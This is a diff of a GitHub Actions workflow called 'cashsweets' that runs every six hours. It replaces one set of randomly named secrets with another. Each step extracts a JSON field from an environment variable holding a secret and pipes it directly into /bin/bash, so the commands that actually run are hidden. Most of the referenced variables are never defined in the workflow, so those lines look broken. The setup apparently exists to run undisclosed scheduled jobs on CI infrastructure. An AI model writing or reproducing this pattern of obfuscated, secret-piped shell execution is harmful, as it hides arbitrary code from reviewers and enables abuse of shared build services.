@@ -1,26 +1,23 @@
 name: cashsweets
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 3/6 * * *'
-
-jobs:  # 12291
+    - cron: '20 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: cashsweets
         env:
-          fqjn8796: ${{ secrets.fqjn8796 }}
+          xyvrk85: ${{ secrets.xyvrk85 }}
         run: |
-          echo $fqjn8796 | jq -r .nizwg25951 | /bin/bash
-          echo $f5018 | jq -r .vdmc5534 | /bin/bash
-          echo $qc58 | jq -r .nkfwk3 | /bin/bash
-          echo $gmf0206 | jq -r .qgloz63 | /bin/bash
-          echo $zw9533 | jq -r .ysvtw25285 | /bin/bash
-          echo $jvro32 | jq -r .sbvuo4460 | /bin/bash
-          echo $snk29581 | jq -r .oc85333 | /bin/bash
-          echo $zmfxo6 | jq -r .wn025 | /bin/bash
-          echo $ds474 | jq -r .ppff71 | /bin/bash
+          echo $xyvrk85 | jq -r .zq284 | /bin/bash
+          echo $kakox9 | jq -r .r92 | /bin/bash
+          echo $gfasu48553 | jq -r .ux5 | /bin/bash
+          echo $om622 | jq -r .u9 | /bin/bash
+          echo $tihp6 | jq -r .ohuvz39759 | /bin/bash
+          echo $daw57 | jq -r .og0491 | /bin/bash
+          echo $gagkq84710 | jq -r .f84 | /bin/bash
 
